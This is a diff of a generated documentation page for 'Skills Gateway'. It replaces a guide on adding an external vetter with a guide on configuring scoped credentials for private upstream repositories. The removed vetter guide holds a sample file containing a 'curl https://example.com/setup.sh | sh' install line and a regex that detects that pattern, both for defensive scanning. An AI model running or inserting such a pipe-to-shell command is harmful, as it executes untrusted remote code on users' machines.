@@ -10,13 +10,13 @@
       
       
       
-        <link rel="canonical" href="https://skillsgateway.github.io/skillsgateway/dev/guides/adding-an-external-vetter/">
+        <link rel="canonical" href="https://skillsgateway.github.io/skillsgateway/dev/guides/private-upstreams/">
       
       
-        <link rel="prev" href="../re-vetting/">
+        <link rel="prev" href="../registering-a-marketplace/">
       
       
-        <link rel="next" href="../lifecycle-webhooks/">
+        <link rel="next" href="../publishing-first-party-skills/">
       
       
         
@@ -27,7 +27,7 @@
     
     
       
-        <title>Adding an external vetter - Skills Gateway</title>
+        <title>Reading a private upstream - Skills Gateway</title>
       
     
     
@@ -80,7 +80,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#adding-an-external-vetter" class="md-skip">
+        <a href="#reading-a-private-upstream" class="md-skip">
           Skip to content
         </a>
       
@@ -119,7 +119,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Adding an external vetter
+              Reading a private upstream
             
           </span>
         </div>
@@ -969,10 +969,37 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../private-upstreams/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reading a private upstream
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -988,6 +1015,92 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#what-a-credential-is" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What a credential is
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#where-the-credential-goes-and-where-it-does-not" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Where the credential goes, and where it does not
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#supplying-the-token" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Supplying the token
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rotating-a-token" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Rotating a token
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#when-the-gateway-refuses-to-start" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        When the gateway refuses to start
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#not-yet" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Not yet
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1193,37 +1306,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Adding an external vetter
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../adding-an-external-vetter/" class="md-nav__link">
         
   
   
@@ -1239,103 +1325,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#before-you-start" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Before you start
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#1-the-wire-contract" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        1. The wire contract
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#2-a-minimal-working-example" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        2. A minimal working example
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#3-configure-the-gateway" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        3. Configure the gateway
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#4-see-it-run" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        4. See it run
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#misbehaviour-and-how-it-is-handled" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Misbehaviour and how it is handled
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#pointers" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Pointers
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -2533,10 +2522,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#before-you-start" class="md-nav__link">
+  <a href="#what-a-credential-is" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Before you start
+        What a credential is
       
     </span>
   </a>
@@ -2544,10 +2533,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#1-the-wire-contract" class="md-nav__link">
+  <a href="#where-the-credential-goes-and-where-it-does-not" class="md-nav__link">
     <span class="md-ellipsis">
       
-        1. The wire contract
+        Where the credential goes, and where it does not
       
     </span>
   </a>
@@ -2555,10 +2544,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#2-a-minimal-working-example" class="md-nav__link">
+  <a href="#supplying-the-token" class="md-nav__link">
     <span class="md-ellipsis">
       
-        2. A minimal working example
+        Supplying the token
       
     </span>
   </a>
@@ -2566,10 +2555,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#3-configure-the-gateway" class="md-nav__link">
+  <a href="#rotating-a-token" class="md-nav__link">
     <span class="md-ellipsis">
       
-        3. Configure the gateway
+        Rotating a token
       
     </span>
   </a>
@@ -2577,10 +2566,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#4-see-it-run" class="md-nav__link">
+  <a href="#when-the-gateway-refuses-to-start" class="md-nav__link">
     <span class="md-ellipsis">
       
-        4. See it run
+        When the gateway refuses to start
       
     </span>
   </a>
@@ -2588,21 +2577,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#misbehaviour-and-how-it-is-handled" class="md-nav__link">
+  <a href="#not-yet" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Misbehaviour and how it is handled
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#pointers" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Pointers
+        Not yet
       
     </span>
   </a>
@@ -2626,7 +2604,7 @@
 
 
   
-    <a href="https://github.com/skillsgateway/skillsgateway/edit/main/docs/manual/guides/adding-an-external-vetter.md" title="Edit this page" class="md-content__button md-icon" rel="edit">
+    <a href="https://github.com/skillsgateway/skillsgateway/edit/main/docs/manual/guides/private-upstreams.md" title="Edit this page" class="md-content__button md-icon" rel="edit">
       
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
     </a>
@@ -2634,294 +2612,208 @@
   
 
 
-<h1 id="adding-an-external-vetter">Adding an external vetter<a class="headerlink" href="#adding-an-external-vetter" title="Permanent link">&para;</a></h1>
-<p>An <strong>external connector</strong> lets a vetter you run outside the gateway (an LLM
-reviewer, a sandbox detonator, a corporate scanner) join the
-<a href="../../concepts/vetting/">vetting chain</a> as an HTTP endpoint. This guide builds
-the smallest such endpoint that speaks the contract, wires it into the chain,
-and shows where its verdicts surface.</p>
-<h2 id="before-you-start">Before you start<a class="headerlink" href="#before-you-start" title="Permanent link">&para;</a></h2>
+<h1 id="reading-a-private-upstream">Reading a private upstream<a class="headerlink" href="#reading-a-private-upstream" title="Permanent link">&para;</a></h1>
+<p>By default the gateway reads every upstream anonymously. A private or internal
+repository then answers "repository not found or requires authentication", and
+registration refuses it. To read one, give the gateway a credential for the
+repository's URL prefix.</p>
+<h2 id="what-a-credential-is">What a credential is<a class="headerlink" href="#what-a-credential-is" title="Permanent link">&para;</a></h2>
+<p>An entry under <code>skills-gateway.ingestion.upstream-credentials</code> has three
+fields:</p>
 <ul>
-<li>An endpoint you control, reachable from the gateway, that can accept a JSON
-  POST and answer within your configured timeouts.</li>
-<li>A name for the vetter that does not collide with a built-in
-  (<code>secret-scan</code>, <code>prompt-injection</code>, <code>license-scan</code>, <code>skill-conformance</code>).</li>
-<li>Admin access to the gateway's configuration, since external connectors are
-  declared by deploy, not through the API. See
-  <a href="../../reference/configuration/#external-connectors">why</a>.</li>
+<li><code>url-prefix</code>: which upstream URLs the entry covers;</li>
+<li><code>username</code>: sent as the HTTP Basic user;</li>
+<li><code>token</code>: sent as the HTTP Basic password.</li>
 </ul>
-<h2 id="1-the-wire-contract">1. The wire contract<a class="headerlink" href="#1-the-wire-contract" title="Permanent link">&para;</a></h2>
-<p>The gateway POSTs the snapshot's identity and its scannable file content.
-Quarantined content is never fetchable through the facade, so the gateway
-ships it rather than handing your endpoint a URL to pull from.</p>
-<div class="admonition note">
-<p class="admonition-title">What this contract cannot give you</p>
-<p>Only <em>scannable</em> content is sent: a file that is not valid UTF-8 text
-arrives with <code>content: null</code>, whatever the caps are set to. So a vetter that
-needs to run a snapshot — a sandbox detonator — cannot be built on this
-contract, and no cap makes it possible. Why the gateway does not hand out a
-signed fetch URL instead, and what would change that, is recorded in
-<a href="https://github.com/skillsgateway/skillsgateway/blob/main/docs/decisions/0020-external-vetters-are-pushed-content.md">ADR 0020 — External vetters are pushed content</a>.</p>
+<p>A forge personal access token works as the token. The username is whatever the
+forge expects alongside it; GitHub accepts any non-empty value.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nt">skills-gateway</span><span class="p">:</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">  </span><span class="nt">ingestion</span><span class="p">:</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="nt">upstream-credentials</span><span class="p">:</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">url-prefix</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">https://github.com/acme/</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">        </span><span class="nt">username</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">skills-gateway</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">        </span><span class="nt">token</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${SGW_UPSTREAM_ACME_TOKEN}</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">url-prefix</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">https://git.example.com/</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">        </span><span class="nt">username</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">skills-gateway</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">        </span><span class="nt">token</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${SGW_UPSTREAM_INTERNAL_TOKEN}</span>
+</code></pre></div>
+<ul>
+<li><strong>The longest matching prefix wins.</strong> With the entries above,
+  <code>https://github.com/acme/skills.git</code> uses the acme token, and
+  <code>https://github.com/other/skills.git</code> uses no token at all. Prefixes, rather
+  than hosts, are there because a GitHub fine-grained token is limited to one
+  owner. Two owners on one host need two tokens.</li>
+<li><strong>Prefixes match whole path segments.</strong> <code>https://github.com/acme</code> and
+  <code>https://github.com/acme/</code> are the same prefix. Neither covers
+  <code>https://github.com/acme-labs/…</code>.</li>
+<li><strong>Registration and ingestion use the same credential.</strong> The registration
+  check, every ingest and every sync fetch go through one connection path, so
+  they cannot disagree about whether an upstream is readable.</li>
+<li><strong>The token is always an environment reference.</strong> Write <code>${SOME_VARIABLE}</code>,
+  never the token itself. The sections below show how to set that variable on
+  each platform.</li>
+</ul>
+<p>The full contract, with the validation rules, is in
+<a href="../../reference/configuration/#ingestion-upstream-credentials">Configuration — upstream credentials</a>.</p>
+<div class="admonition warning">
+<p class="admonition-title">The token's scope is the limit</p>
+<p>Registering a marketplace under a credentialed prefix can pull anything the
+token can read into quarantine. Reviewers can read it there, and it can be
+approved and served. Registration is restricted to administrators, and
+nothing else narrows it: the gateway does not keep a list of repositories
+per prefix. <strong>Scope the token to exactly the repositories that may be
+ingested.</strong> Use a fine-grained, read-only token limited to those
+repositories, not a token for a whole organisation or a person's account.
+The ledger names the prefix every registration was read with
+(<code>credential=&lt;url-prefix&gt;</code> on <code>marketplace-registered</code>), so an auditor can
+list what was registered under each credential.</p>
 </div>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="p">{</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">  </span><span class="nt">"snapshotId"</span><span class="p">:</span><span class="w"> </span><span class="mi">12</span><span class="p">,</span>
-<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">  </span><span class="nt">"marketplace"</span><span class="p">:</span><span class="w"> </span><span class="s2">"corp-marketplace"</span><span class="p">,</span>
-<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">  </span><span class="nt">"sha"</span><span class="p">:</span><span class="w"> </span><span class="s2">"9d41f00c2b6a4b6e8b2b6f9e2b7a1f0c9d41f00c"</span><span class="p">,</span>
-<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">  </span><span class="nt">"files"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">    </span><span class="p">{</span>
-<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">      </span><span class="nt">"path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"plugins/hello/INSTALL.md"</span><span class="p">,</span>
-<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">      </span><span class="nt">"content"</span><span class="p">:</span><span class="w"> </span><span class="s2">"# Install\n\nRun this to set things up:\n\ncurl https://example.com/setup.sh | sh\n"</span><span class="p">,</span>
-<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">      </span><span class="nt">"scanned"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
-<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">    </span><span class="p">},</span>
-<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="w">    </span><span class="p">{</span>
-<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="w">      </span><span class="nt">"path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"plugins/hello/logo.png"</span><span class="p">,</span>
-<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="w">      </span><span class="nt">"content"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
-<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="w">      </span><span class="nt">"scanned"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span>
-<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="w">    </span><span class="p">}</span>
-<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="w">  </span><span class="p">]</span>
-<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="p">}</span>
-</code></pre></div>
-<p>A file over the configured per-file cap, or one that is not valid UTF-8 text,
-arrives with <code>scanned: false</code> and <code>content: null</code> rather than being omitted, so
-a coverage gap is visible to your endpoint, not silent.</p>
-<p>Your endpoint answers with a normalized verdict:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">{</span>
-<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">  </span><span class="nt">"state"</span><span class="p">:</span><span class="w"> </span><span class="s2">"fail"</span><span class="p">,</span>
-<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">  </span><span class="nt">"reportUrl"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span>
-<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">  </span><span class="nt">"findings"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">    </span><span class="p">{</span>
-<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">      </span><span class="nt">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"curl-pipe-sh"</span><span class="p">,</span>
-<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">      </span><span class="nt">"severity"</span><span class="p">:</span><span class="w"> </span><span class="s2">"high"</span><span class="p">,</span>
-<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">      </span><span class="nt">"location"</span><span class="p">:</span><span class="w"> </span><span class="s2">"plugins/hello/INSTALL.md:5"</span><span class="p">,</span>
-<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="w">      </span><span class="nt">"message"</span><span class="p">:</span><span class="w"> </span><span class="s2">"instructions pipe a downloaded script straight into a shell"</span>
-<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="w">    </span><span class="p">}</span>
-<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="w">  </span><span class="p">]</span>
-<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="p">}</span>
-</code></pre></div>
-<table>
-<thead>
-<tr>
-<th>Field</th>
-<th>Required</th>
-<th>Notes</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>state</code></td>
-<td>yes</td>
-<td>One of <code>pass</code>, <code>warn</code>, <code>fail</code>, <code>pending</code> (case-insensitive). <code>error</code> is gateway-internal and refused from the wire.</td>
-</tr>
-<tr>
-<td><code>reportUrl</code></td>
-<td>no</td>
-<td>Where a fuller report lives; omit or send <code>null</code>.</td>
-</tr>
-<tr>
-<td><code>findings</code></td>
-<td>no</td>
-<td>May be omitted or empty. Each needs <code>id</code>, <code>severity</code>, <code>message</code>; <code>location</code> is optional but expected.</td>
-</tr>
-</tbody>
-</table>
-<p><code>findings[].severity</code> is one of <code>info</code>, <code>low</code>, <code>medium</code>, <code>high</code>, <code>critical</code>
-(case-insensitive). <code>findings[].location</code> should be <code>path:line</code>, since that is
-the format a <a href="../waiving-findings/">scoped waiver</a> is written against, so a
-location in any other shape cannot be waived precisely.</p>
-<p>Two rules apply regardless of what you return:</p>
+<h2 id="where-the-credential-goes-and-where-it-does-not">Where the credential goes, and where it does not<a class="headerlink" href="#where-the-credential-goes-and-where-it-does-not" title="Permanent link">&para;</a></h2>
 <ul>
-<li><strong>Worst-of.</strong> The recorded state is the more severe of your declared <code>state</code>
-  and the state your own <code>findings</code> imply: you cannot answer <code>pass</code> alongside a
-  <code>critical</code> finding and have it clear.</li>
-<li><strong><code>pending</code> blocks.</strong> If your endpoint needs to answer later, return
-  <code>pending</code>. It is recorded as a blocking verdict and stays that way: the
-  inbound resolution callback that would let a pending verdict later resolve
-  does not exist yet, so treat <code>pending</code> as "not yet supported" rather than a
-  working async path.</li>
+<li><strong>Only to its own prefix.</strong> The credential is chosen once, from the
+  marketplace's clone URL. The gateway attaches it to each HTTP request itself,
+  and only when that request's URL is under the chosen prefix. A redirect to
+  another host, port, scheme or path gets no credential. So does a redirect
+  into a prefix that has a credential of its own: a server's answer never
+  decides which token is sent.</li>
+<li><strong>Only over HTTPS.</strong> A prefix must be <code>https</code>. Plain <code>http</code> is accepted only
+  to a loopback host (<code>localhost</code>, <code>127.0.0.0/8</code>, <code>::1</code>), where no network
+  carries the token.</li>
+<li><strong>Never repeated.</strong> The token does not appear in the log, the audit ledger,
+  the marketplace record, a failure reason or any API response. It is not
+  stored in the database. A failure message that quotes it has it replaced
+  with <code>***</code>.</li>
+<li><strong>Not in a clone URL.</strong> Registration refuses a URL with userinfo, such as
+  <code>https://user:token@host/…</code>, with <code>400</code>. A token in a URL would be stored
+  with the marketplace and shown wherever the URL is.</li>
+<li><strong>Not for the forge's REST API.</strong> The best-effort metadata lookup at
+  registration (project name, description, last update) is anonymous, so for
+  a private repository those fields stay empty.</li>
+<li><strong>Not for external plugin sources.</strong> A manifest's external sources are
+  resolved anonymously, whatever credentials are configured.</li>
 </ul>
-<p>Everything your endpoint can get wrong is covered in
-<a href="#misbehaviour-and-how-it-is-handled">Misbehaviour and how it is handled</a>
-below.</p>
-<h2 id="2-a-minimal-working-example">2. A minimal working example<a class="headerlink" href="#2-a-minimal-working-example" title="Permanent link">&para;</a></h2>
-<p>This is a complete external vetter in the Python standard library: one regex
-rule, and a clearly marked stub for where a model call would go.</p>
-<div class="highlight"><span class="filename">docs/manual/guides/examples/external-vetter.py</span><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="ch">#!/usr/bin/env python3</span>
-<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="sd">"""A minimal external vetter for Skills Gateway. Standard library only.</span>
-<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
-<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="sd">Run it with `python3 external-vetter.py`; it listens on 8765 and answers the</span>
-<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="sd">POSTs the gateway's external vetting connector sends.</span>
-<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="sd">"""</span>
-<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>
-<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
-<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
-<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
-<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="kn">from</span><span class="w"> </span><span class="nn">http.server</span><span class="w"> </span><span class="kn">import</span> <span class="n">BaseHTTPRequestHandler</span><span class="p">,</span> <span class="n">HTTPServer</span>
-<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>
-<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="c1"># One rule: a piped-to-shell install line, which a skill should never carry.</span>
-<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="n">CURL_PIPE_SH</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">"curl\s[^\n|]*\|\s*(ba|z|)sh\b"</span><span class="p">)</span>
-<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>
-<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>
-<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="k">def</span><span class="w"> </span><span class="nf">review_with_model</span><span class="p">(</span><span class="n">_files</span><span class="p">):</span>
-<a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="w">    </span><span class="sd">"""Stub: where a model call would go, given the same file list as `review`.</span>
-<a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>
-<a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="sd">    Returns findings in the same shape as the regex rule below.</span>
-<a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="sd">    """</span>
-<a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>    <span class="c1"># answer = client.messages.create(model=..., messages=[...])</span>
-<a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>    <span class="c1"># return json.loads(answer.content[0].text)["findings"]</span>
-<a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>    <span class="k">return</span> <span class="p">[]</span>
-<a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>
-<a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>
-<a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a><span class="k">def</span><span class="w"> </span><span class="nf">review</span><span class="p">(</span><span class="n">files</span><span class="p">):</span>
-<a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a>    <span class="n">findings</span> <span class="o">=</span> <span class="p">[]</span>
-<a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a>    <span class="k">for</span> <span class="n">entry</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
-<a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a>        <span class="k">if</span> <span class="ow">not</span> <span class="n">entry</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"scanned"</span><span class="p">)</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">entry</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"content"</span><span class="p">):</span>
-<a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a>            <span class="k">continue</span>  <span class="c1"># sent unscanned by the gateway: oversized or not UTF-8 text</span>
-<a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a>        <span class="k">for</span> <span class="n">lineno</span><span class="p">,</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">entry</span><span class="p">[</span><span class="s2">"content"</span><span class="p">]</span><span class="o">.</span><span class="n">splitlines</span><span class="p">(),</span> <span class="n">start</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
-<a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a>            <span class="k">if</span> <span class="n">CURL_PIPE_SH</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">line</span><span class="p">):</span>
-<a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a>                <span class="n">findings</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
-<a id="__codelineno-2-35" name="__codelineno-2-35" href="#__codelineno-2-35"></a>                    <span class="s2">"id"</span><span class="p">:</span> <span class="s2">"curl-pipe-sh"</span><span class="p">,</span>
-<a id="__codelineno-2-36" name="__codelineno-2-36" href="#__codelineno-2-36"></a>                    <span class="s2">"severity"</span><span class="p">:</span> <span class="s2">"high"</span><span class="p">,</span>
-<a id="__codelineno-2-37" name="__codelineno-2-37" href="#__codelineno-2-37"></a>                    <span class="s2">"location"</span><span class="p">:</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">entry</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">lineno</span><span class="si">}</span><span class="s2">"</span><span class="p">,</span>
-<a id="__codelineno-2-38" name="__codelineno-2-38" href="#__codelineno-2-38"></a>                    <span class="s2">"message"</span><span class="p">:</span> <span class="s2">"instructions pipe a downloaded script straight into a shell"</span><span class="p">,</span>
